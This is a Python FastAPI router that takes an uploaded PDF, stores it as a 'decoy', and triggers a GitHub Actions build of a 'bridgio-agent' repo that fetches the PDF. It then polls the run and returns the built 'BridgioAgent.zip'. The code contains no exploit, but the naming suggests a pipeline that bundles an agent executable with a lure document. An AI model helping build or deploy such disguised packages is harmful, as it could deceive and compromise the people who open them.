import asyncio
import io
import json
import os
import urllib.error
import urllib.request
import uuid

from fastapi import APIRouter, HTTPException, Query, UploadFile, File
from fastapi.responses import Response, StreamingResponse

from .state import GITHUB_TOKEN
from .utils import _auth

router = APIRouter()

REPO = "waqarulwahab/bridgio-agent"
API = "https://api.github.com"

# Temp storage for pending PDFs (uuid -> filepath)
_pending_pdfs: dict[str, str] = {}

DATA_DIR = os.environ.get("DB_PATH", "").replace("bridgio.db", "") or "/app/data"


def _gh(method: str, path: str, body=None):
    url = f"{API}{path}"
    data = json.dumps(body).encode() if body else None
    req = urllib.request.Request(url, data=data, method=method)
    req.add_header("Authorization", f"token {GITHUB_TOKEN}")
    req.add_header("Accept", "application/vnd.github+json")
    req.add_header("X-GitHub-Api-Version", "2022-11-28")
    if data:
        req.add_header("Content-Type", "application/json")
    try:
        with urllib.request.urlopen(req, timeout=30) as r:
            if r.status == 204:
                return {}
            return json.loads(r.read())
    except urllib.error.HTTPError as e:
        err_body = e.read().decode()
        raise HTTPException(e.code, f"GitHub API error: {err_body}")


@router.post("/api/build")
async def trigger_build(t: str = Query(...), pdf: UploadFile = File(...)):
    _auth(t)
    if not GITHUB_TOKEN:
        raise HTTPException(500, "GITHUB_TOKEN not configured on server")

    pdf_bytes = await pdf.read()
    if not pdf_bytes:
        raise HTTPException(400, "Empty PDF file")

    # Save PDF temporarily — no commit to repo
    pdf_id = str(uuid.uuid4())
    pdf_path = os.path.join(DATA_DIR, f"decoy_{pdf_id}.pdf")
    os.makedirs(DATA_DIR, exist_ok=True)
    with open(pdf_path, "wb") as f:
        f.write(pdf_bytes)
    _pending_pdfs[pdf_id] = pdf_path

    # Note current run count before triggering
    before = _gh("GET", f"/repos/{REPO}/actions/workflows/build.yml/runs?per_page=1")
    before_count = before.get("total_count", 0)

    # Build the backend PDF URL for the runner to download
    backend_url = os.environ.get("BACKEND_PUBLIC_URL", "https://backend.bridgio.waqarulwahab.me")
    pdf_url = f"{backend_url}/api/build/pdf/{pdf_id}"

    # Trigger workflow_dispatch with pdf_url input
    _gh("POST", f"/repos/{REPO}/actions/workflows/build.yml/dispatches", {
        "ref": "main",
        "inputs": {"pdf_url": pdf_url},
    })

    # Poll up to 20s for new run to appear
    run_id = None
    for _ in range(10):
        await asyncio.sleep(2)
        runs = _gh("GET", f"/repos/{REPO}/actions/workflows/build.yml/runs?per_page=1")
        if runs.get("total_count", 0) > before_count:
            items = runs.get("workflow_runs", [])
            if items:
                run_id = items[0]["id"]
                break

    return {"run_id": run_id, "repo": REPO}


@router.get("/api/build/pdf/{pdf_id}")
async def serve_pdf(pdf_id: str):
    # UUID is the secret — no token auth needed here
    # Sanitize to avoid path traversal
    if not all(c in "0123456789abcdef-" for c in pdf_id):
        raise HTTPException(400, "Invalid id")
    path = _pending_pdfs.get(pdf_id)
    if not path or not os.path.exists(path):
        raise HTTPException(404, "PDF not found or already used")
    with open(path, "rb") as f:
        data = f.read()
    # Clean up after serving
    try:
        os.remove(path)
        _pending_pdfs.pop(pdf_id, None)
    except Exception:
        pass
    return Response(content=data, media_type="application/pdf")


@router.get("/api/build/status")
async def build_status(run_id: int, t: str = Query(...)):
    _auth(t)
    if not GITHUB_TOKEN:
        raise HTTPException(500, "GITHUB_TOKEN not configured on server")
    run = _gh("GET", f"/repos/{REPO}/actions/runs/{run_id}")
    return {
        "status": run.get("status"),
        "conclusion": run.get("conclusion"),
        "html_url": run.get("html_url"),
    }


@router.get("/api/build/download")
async def build_download(run_id: int, t: str = Query(...)):
    _auth(t)
    if not GITHUB_TOKEN:
        raise HTTPException(500, "GITHUB_TOKEN not configured on server")

    artifacts = _gh("GET", f"/repos/{REPO}/actions/runs/{run_id}/artifacts")
    items = artifacts.get("artifacts", [])
    if not items:
        raise HTTPException(404, "No artifacts yet — build may still be running")

    artifact_id = items[0]["id"]
    url = f"{API}/repos/{REPO}/actions/artifacts/{artifact_id}/zip"

    req = urllib.request.Request(url)
    req.add_header("Authorization", f"token {GITHUB_TOKEN}")
    req.add_header("Accept", "application/vnd.github+json")

    with urllib.request.urlopen(req, timeout=120) as r:
        data = r.read()

    return StreamingResponse(
        io.BytesIO(data),
        media_type="application/zip",
        headers={"Content-Disposition": "attachment; filename=BridgioAgent.zip"},
    )
